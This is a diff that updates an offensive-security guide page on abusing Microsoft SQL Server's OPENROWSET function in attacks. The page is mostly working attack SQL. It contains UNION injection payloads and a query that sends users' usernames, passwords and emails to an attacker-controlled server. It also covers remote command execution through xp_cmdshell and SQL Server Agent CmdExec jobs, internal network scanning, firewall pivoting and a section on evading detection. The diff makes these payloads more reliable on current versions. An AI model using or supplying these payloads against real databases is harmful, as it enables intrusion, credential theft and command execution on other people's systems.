@@ -4,7 +4,7 @@ description: Exploiting OPENROWSET functionality in MSSQL for advanced attacks
 category: Advanced Techniques
 order: 12
 tags: ["openrowset", "linked servers", "data access"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 The `OPENROWSET` function in Microsoft SQL Server provides a way to access remote data from various data sources including other SQL Server instances, Excel files, and virtually any OLE DB provider. While intended for legitimate data integration, this functionality can be exploited in SQL injection attacks to access remote systems, exfiltrate data, or bypass security controls.
@@ -23,11 +23,13 @@ SELECT * FROM OPENROWSET(
 
 Common providers:
 
-- 'MSOLEDBSQL' (Microsoft OLE DB Driver for SQL Server — recommended for SQL Server 2017+)
-- 'SQLNCLI' / 'SQLNCLI11' (SQL Server Native Client — deprecated, removed in SQL Server 2022)
-- 'SQLOLEDB' (Legacy OLE DB Provider — deprecated since SQL Server 2012, retained for backward compatibility)
-- 'Microsoft.ACE.OLEDB.12.0' (Access, Excel)
-- 'MSDASQL' (ODBC)
+- `MSOLEDBSQL` (Microsoft OLE DB Driver for SQL Server — the current, recommended provider; first released in 2018 and included with SQL Server 2019+; not registered on SQL Server 2017 for Linux)
+- `SQLNCLI` / `SQLNCLI11` (SQL Server Native Client — deprecated; SNAC 11, from SQL Server 2012, was the last version and shipped with SQL Server 2012 through 2019, but not with 2022)
+- `SQLOLEDB` (legacy MDAC OLE DB provider — deprecated, unmaintained, retained on Windows for backward compatibility)
+- `Microsoft.ACE.OLEDB.12.0` (Access, Excel — requires the Access Database Engine redistributable installed on the server)
+- `MSDASQL` (OLE DB-over-ODBC bridge)
+
+The four SQL Server provider names (`MSOLEDBSQL`, `SQLNCLI`, `SQLNCLI11`, `SQLOLEDB`) all connect to SQL Server. On SQL Server 2019 and 2022 for Linux all four resolve; on 2017 for Linux `MSOLEDBSQL` is not registered (Msg 7403), and on Windows each is a separately installed provider. The non-SQL-Server providers (`Microsoft.ACE.OLEDB.12.0`, `MSDASQL`) are Windows-only and must be installed separately; on SQL Server for Linux they fail with "Only a SQL Server provider is allowed on this instance." Examples below use `MSOLEDBSQL`.
 
 ## Prerequisites for Exploitation
 
@@ -42,7 +44,7 @@ OPENROWSET attacks typically require:
    RECONFIGURE;
    ```
 
-2. Sufficient permissions (typically sysadmin or similar high privileges)
+2. Nothing more on the local server: once ad hoc queries are enabled, any authenticated login can use the provider, and the remote side grants whatever the supplied credentials allow
 3. Appropriate network connectivity from the SQL Server to target systems
 
 ## Attack Techniques
@@ -54,20 +56,20 @@ Connect to another SQL Server to access or exfiltrate data:
 ```sql
 -- Basic connection to another SQL Server
 SELECT * FROM OPENROWSET(
-    'SQLNCLI',
+    'MSOLEDBSQL',
     'Server=remote-server;Trusted_Connection=yes;',
     'SELECT @@version'
 )
 
 -- Using SQL authentication
 SELECT * FROM OPENROWSET(
-    'SQLNCLI',
+    'MSOLEDBSQL',
     'Server=remote-server;uid=sa;pwd=password;',
     'SELECT * FROM master.sys.server_principals'
 )
 ```
 
-**Legacy Provider Note:** SQLOLEDB has been deprecated since SQL Server 2012 and receives no security updates or bug fixes. It remains available on Windows for backward compatibility but is unmaintained. For SQL Server 2019+, use **MSOLEDBSQL** (Microsoft OLE DB Driver) or modern ODBC drivers instead.
+**Legacy Provider Note:** SQLOLEDB has been deprecated since SQL Server 2012 and receives no security updates or bug fixes. It remains available on Windows for backward compatibility but is unmaintained. On all versions, use **MSOLEDBSQL** (Microsoft OLE DB Driver) or modern ODBC drivers instead.
 
 ```sql
 -- SQLOLEDB example (legacy/educational — no vendor support on current SQL Server versions)
@@ -77,7 +79,7 @@ SELECT * FROM OPENROWSET(
     'SET FMTONLY OFF execute master..xp_cmdshell "dir"'
 );
 
--- Recommended: Use MSOLEDBSQL on SQL Server 2017+
+-- Recommended: use MSOLEDBSQL (included with SQL Server 2019+)
 SELECT * FROM OPENROWSET(
     'MSOLEDBSQL',
     'Server=127.0.0.1;uid=sa;pwd=p4ssw0rd;',
@@ -85,9 +87,11 @@ SELECT * FROM OPENROWSET(
 );
 ```
 
+The `SET FMTONLY OFF` trick forced older SQL Server versions to execute the batch while probing it for result-set metadata. `SET FMTONLY` has been deprecated since SQL Server 2012, and on current versions the trick is unreliable (observed on 2022): metadata discovery cannot be performed for a batch that invokes an extended stored procedure, so the call fails with "The metadata could not be determined because statement '...' invokes an extended stored procedure" before `xp_cmdshell` runs. It also requires `xp_cmdshell` to be enabled on the target and so does not work against SQL Server for Linux.
+
 ### File System Access
 
-Read or write files using OPENROWSET with Excel or text providers:
+Read files using OPENROWSET with the ACE (Excel/Access/Text) provider. This requires the Access Database Engine redistributable to be installed on the server and is Windows-only — on SQL Server for Linux these calls fail with "Only a SQL Server provider is allowed on this instance." To read arbitrary files without an extra provider, use `OPENROWSET(BULK ...)` instead (see [Reading Files](/mssql/reading-files)).
 
 ```sql
 -- Reading an Excel file
@@ -112,7 +116,7 @@ OPENROWSET can be used for internal network scanning:
 ```sql
 -- Testing if a server exists and accepts SQL connections
 BEGIN TRY
-    SELECT 1 FROM OPENROWSET('SQLNCLI', 'Server=192.168.1.10;uid=sa;pwd=test;', 'SELECT 1')
+    SELECT 1 FROM OPENROWSET('MSOLEDBSQL', 'Server=192.168.1.10;uid=sa;pwd=test;', 'SELECT 1')
     SELECT 'Server is reachable'
 END TRY
 BEGIN CATCH
@@ -125,7 +129,7 @@ END CATCH
 ```sql
 -- Exfiltrate data to another SQL Server
 INSERT INTO OPENROWSET(
-    'SQLNCLI',
+    'MSOLEDBSQL',
     'Server=attacker-server;uid=sa;pwd=password;',
     'AttackerDB.dbo.StolenData'
 )
@@ -134,42 +138,41 @@ SELECT username, password, email FROM users
 
 ### Command Execution via SQL Server Agent
 
-This technique combines OPENROWSET with SQL Server Agent to execute commands:
+This technique combines OPENROWSET with SQL Server Agent on a remote Windows server to execute commands. `EXEC OPENROWSET(...)` is not valid syntax, and the provider, connection string and query arguments must be string literals (they cannot be concatenated from variables). Instead, call the procedures through the `SELECT ... FROM OPENROWSET(...)` form. Because `sp_add_job`/`sp_add_jobstep`/`sp_start_job` return no result set, append a `SELECT` so OPENROWSET can determine metadata:
 
 ```sql
--- Create a job on a remote server to execute commands
-DECLARE @job_name nvarchar(100) = 'remote_cmd'
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
-'msdb.dbo.sp_add_job @job_name='''+@job_name+''', @enabled=1, @description=''Remote command execution''')
+-- Create and start a CmdExec job on a remote server (SQL Server Agent must be running there)
+SELECT * FROM OPENROWSET('MSOLEDBSQL', 'Server=remote-server;uid=sa;pwd=password;',
+'EXEC msdb.dbo.sp_add_job @job_name=''remote_cmd'', @enabled=1; SELECT 1 AS done');
 
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
-'msdb.dbo.sp_add_jobstep
-    @job_name='''+@job_name+''',
-    @step_name=''exec_cmd'',
-    @subsystem=''CmdExec'',
-    @command=''cmd.exe /c dir > c:\temp\output.txt'',
-    @on_success_action=1')
+SELECT * FROM OPENROWSET('MSOLEDBSQL', 'Server=remote-server;uid=sa;pwd=password;',
+'EXEC msdb.dbo.sp_add_jobstep @job_name=''remote_cmd'', @step_name=''exec_cmd'',
+    @subsystem=''CmdExec'', @command=''cmd.exe /c dir > C:\temp\output.txt'',
+    @on_success_action=1; SELECT 1 AS done');
 
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
-'msdb.dbo.sp_start_job @job_name='''+@job_name+'''')
+SELECT * FROM OPENROWSET('MSOLEDBSQL', 'Server=remote-server;uid=sa;pwd=password;',
+'EXEC msdb.dbo.sp_add_jobserver @job_name=''remote_cmd'';
+    EXEC msdb.dbo.sp_start_job @job_name=''remote_cmd''; SELECT 1 AS done');
 ```
+
+When the server and credentials need to come from variables, build the whole statement as a string and run it with `EXEC(@sql)` (see [Dynamic Construction](#dynamic-construction-to-avoid-detection) below), since the literal-argument rule applies to OPENROWSET itself.
 
 ## Practical SQL Injection Examples
 
 ### Basic OPENROWSET Injection
 
 ```sql
--- Injection in a vulnerable query
-' UNION SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker-server;uid=sa;pwd=password;', 'SELECT @@version')--
+-- String context, 1-column query (the remote query must return the same column count)
+' UNION SELECT * FROM OPENROWSET('MSOLEDBSQL', 'Server=attacker-server;uid=sa;pwd=password;', 'SELECT @@version')--
 ```
 
 ### Nested OPENROWSET Attacks
 
 ```sql
--- Chain multiple OPENROWSET calls
-' UNION SELECT * FROM OPENROWSET('SQLNCLI',
+-- Chain multiple OPENROWSET calls (string context; sensitive_table must match the host query column count)
+' UNION SELECT * FROM OPENROWSET('MSOLEDBSQL',
     'Server=server1;uid=sa;pwd=password;',
-    'SELECT * FROM OPENROWSET(''SQLNCLI'',
+    'SELECT * FROM OPENROWSET(''MSOLEDBSQL'',
         ''Server=server2;uid=sa;pwd=password;'',
         ''SELECT * FROM sensitive_table'')')--
 ```
@@ -179,10 +182,10 @@ EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
 When direct connections are blocked by firewalls, OPENROWSET can be used to "hop" through servers:
 
 ```sql
--- Using an intermediary server to reach a blocked target
-' UNION SELECT * FROM OPENROWSET('SQLNCLI',
+-- Using an intermediary server to reach a blocked target (string context; column counts must match)
+' UNION SELECT * FROM OPENROWSET('MSOLEDBSQL',
     'Server=allowed-server;uid=sa;pwd=password;',
-    'SELECT * FROM OPENROWSET(''SQLNCLI'',
+    'SELECT * FROM OPENROWSET(''MSOLEDBSQL'',
         ''Server=blocked-server;uid=sa;pwd=password;'',
         ''SELECT * FROM sensitive_data'')')--
 ```
@@ -193,7 +196,7 @@ When direct connections are blocked by firewalls, OPENROWSET can be used to "hop
 
 ```sql
 -- Using variables to avoid string detection
-DECLARE @provider nvarchar(100) = 'SQLNCLI'
+DECLARE @provider nvarchar(100) = 'MSOLEDBSQL'
 DECLARE @conn nvarchar(200) = 'Server=target;uid=sa;pwd=password;'
 DECLARE @query nvarchar(100) = 'SELECT * FROM users'
 EXEC('SELECT * FROM OPENROWSET(''' + @provider + ''', ''' + @conn + ''', ''' + @query + ''')')
@@ -202,11 +205,13 @@ EXEC('SELECT * FROM OPENROWSET(''' + @provider + ''', ''' + @conn + ''', ''' + @
 ### Using Alternative Providers
 
 ```sql
--- Using less common providers
+-- Using the OLE DB-over-ODBC bridge with an ODBC driver (Windows only)
 SELECT * FROM OPENROWSET('MSDASQL',
-    'Driver={SQL Server};Server=target;uid=sa;pwd=password;',
+    'Driver={ODBC Driver 17 for SQL Server};Server=target;uid=sa;pwd=password;',
     'SELECT @@version')
 ```
+
+`MSDASQL` is Windows-only and relies on an installed ODBC driver (the old `{SQL Server}` driver may be absent on modern systems; `{ODBC Driver 17/18 for SQL Server}` is current). It is unavailable on SQL Server for Linux.
 
 ## Mitigations and Countermeasures
 
